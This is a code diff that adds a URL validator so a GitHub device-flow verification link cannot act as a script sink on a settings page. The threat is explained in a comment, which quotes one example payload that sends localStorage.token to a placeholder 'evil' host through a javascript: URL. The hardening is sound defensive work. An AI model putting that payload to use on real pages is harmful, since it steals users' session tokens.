@@ -371,6 +371,38 @@ export function feedbackBaseOf(settings) {
   return `${parsed.origin}${parsed.pathname}`.replace(/\/+$/, '')
 }
 
+/**
+ * The GitHub device-flow verification address, as the page is allowed to see it.
+ *
+ * `verifyUrl` arrives from the collector and goes straight into an `href` and a
+ * `window.open`, so it is a URL the *page* will navigate to — an unvalidated one
+ * is a script sink: a compromised or misconfigured collector could answer
+ * `javascript:fetch('//evil/'+localStorage.token)` and the settings page would
+ * run it on the user's click, in the same origin that holds the management
+ * session. React 19 turns a `javascript:` href into a throwing URL, which caps
+ * the damage to one href — but the `window.open` beside it is a plain browser
+ * call and takes any scheme the browser will follow, and a future React that
+ * stops warning is not a defence.
+ *
+ * So only https to a host is accepted, plus loopback http for a local collector
+ * (the same exception `feedbackBaseOf` makes). Anything else degrades to the
+ * canonical device page rather than failing the sign-in: a user who cannot see
+ * the code has no way forward, and the code is what the page shows next to it.
+ *
+ * @param {unknown} value - the collector's `verifyUrl`.
+ * @returns {string} a safe absolute http(s) URL.
+ */
+export function safeVerifyUrl(value) {
+  const fallback = 'https://github.com/login/device'
+  if (typeof value !== 'string' || value === '' || value.length > 2048) return fallback
+  let parsed
+  try { parsed = new URL(value.trim()) } catch { return fallback }
+  if (parsed.username || parsed.password) return fallback
+  const loopback = ['127.0.0.1', 'localhost', '[::1]'].includes(parsed.hostname)
+  if (parsed.protocol !== 'https:' && !(loopback && parsed.protocol === 'http:')) return fallback
+  return parsed.href
+}
+
 async function feedbackCall(url, init = {}, fetchImpl = fetch) {
   let response
   try {
@@ -430,7 +462,7 @@ export function createFeedback({ settings, persist, fetch: fetchImpl = fetch }) 
       return {
         session: body.session,
         userCode: body.userCode,
-        verifyUrl: typeof body.verifyUrl === 'string' ? body.verifyUrl : 'https://github.com/login/device',
+        verifyUrl: safeVerifyUrl(body.verifyUrl),
         expiresIn: Number(body.expiresIn) || 900,
       }
     },
